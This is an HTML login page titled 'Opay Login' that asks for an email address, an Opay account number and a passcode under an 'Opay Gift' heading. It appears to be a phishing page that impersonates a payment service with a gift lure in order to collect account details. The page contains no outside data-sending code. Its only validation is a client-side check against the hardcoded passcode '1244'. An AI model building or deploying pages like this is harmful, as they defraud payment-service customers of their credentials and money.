<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opay Login</title>
    <style>
        body {
            background-image: url('https://i.postimg.cc/nc3kDjvR/download.jpg');
            background-size: cover;
            font-family: Arial, sans-serif;
            color: #fff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .slideshow-container {
            width: 100%;
            overflow: hidden;
            border-radius: 10px;
        }
        .slideshow {
            display: flex;
            width: 300%;
            animation: slide 9s infinite;
        }
        .slideshow img {
            width: 100%;
            height: 200px;
            border-radius: 10px;
        }
        @keyframes slide {
            0% { transform: translateX(0%); }
            33% { transform: translateX(-100%); }
            66% { transform: translateX(-200%); }
            100% { transform: translateX(0%); }
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group input {
            width: calc(100% - 20px);
            padding: 10px;
            margin-top: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        .form-group label {
            display: block;
            text-align: left;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background: #28a745;
            color: #fff;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #218838;
        }
    </style>
    <script>
        function validateLogin() {
            const passcode = document.getElementById('passcode').value;
            if (passcode !== '1244') {
                alert('Incorrect passcode');
                return false;
            }
            return true;
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="slideshow-container">
            <div class="slideshow">
                <img src="https://i.postimg.cc/3wvCVtzV/download-5.jpg" alt="Slideshow Image 1">
                <img src="https://i.postimg.cc/QtZk3p3t/images-2.png" alt="Slideshow Image 2">
                <img src="https://i.postimg.cc/YSPTQjMT/images-7.jpg" alt="Slideshow Image 3">
            </div>
        </div>
        <h2>Login to Opay Gift with the Following Details Below ðŸ‘‡ðŸ‘‡ðŸ‘‡</h2>
        <form onsubmit="return validateLogin()">
            <div class="form-group">
                <label for="email">Email Address:</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="account-number">Opay Account Number:</label>
                <input type="text" id="account-number" name="account-number" required>
            </div>
            <div class="form-group">
                <label for="passcode">Passcode:</label>
                <input type="password" id="passcode" name="passcode" required>
            </div>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
